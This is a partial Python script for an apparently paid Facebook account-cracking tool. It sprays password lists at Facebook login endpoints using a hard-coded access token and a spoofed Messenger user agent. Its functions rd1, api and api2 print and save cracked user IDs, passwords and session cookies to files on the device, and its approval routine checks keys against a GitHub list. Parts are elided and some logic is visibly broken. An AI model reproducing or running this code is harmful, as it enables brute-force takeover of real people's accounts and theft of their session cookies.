...
os.system('xdg-open https://www.facebook.com/profile.php?id=61557377184325')
try:
...
def u_a():
    g = "[FBAN/Orca-Android;FBAV/50.0.0.22.36;FBBV/122216364;FBDM/{density=4.7,width=1440,height=2560};FBLC/hi_IN;FBCR/Kajeet;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-G920P;FBSV/8.0;nullFBCA/armeabi-v7a:armeabi;]"
...
logo=(f"""\033[96;1m 
\033[96;1m 888b     d888 888b     d888 
\033[96;1m 8888b   d8888 8888b   d8888 
\033[96;1m 88888b.d88888 88888b.d88888 
\033[96;1m 888Y88888P888 888Y88888P888 
\033[96;1m 888 Y888P 888 888 Y888P 888 
\033[96;1m 888  Y8P  888 888  Y8P  888 
\033[96;1m 888   "   888 888   "   888 
\033[96;1m 888       888 888       888 
...
def pp():
	...
	try:
			ck = usman('https://github.com/eoinkhan/Approval-/blob/main/Approval.txt','GET')
			if ky in ck:
				linex()
				...
				os.system('xdg-open https://www.facebook.com/profile.php?id=61557377184325?text=*HELLO*%2C%20*SIR*%20*I*%20*WANT*%20*TO*%20*YOUR*%20*MM*%20*TOOL*%20*PAID*%20*APPROVAL*%20/%20%20*My*%20*Key*%20*:*%20'+str(ky))
				pp()
...
def rd1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [MM-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '6060049699|7171500730:AAFMZpmMrkHV07aUFGhT_l3K4Qp7gY48cwY'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [MM-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/MM-R-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/MM-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(ids))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        #print('\r\r\x1b[1;31m [MM-CP] '+str(ids)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MM-R-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def api(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [MM-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [MM-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/MM-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/MM-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[MM-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [MM-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MM-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/MM-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [MM-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
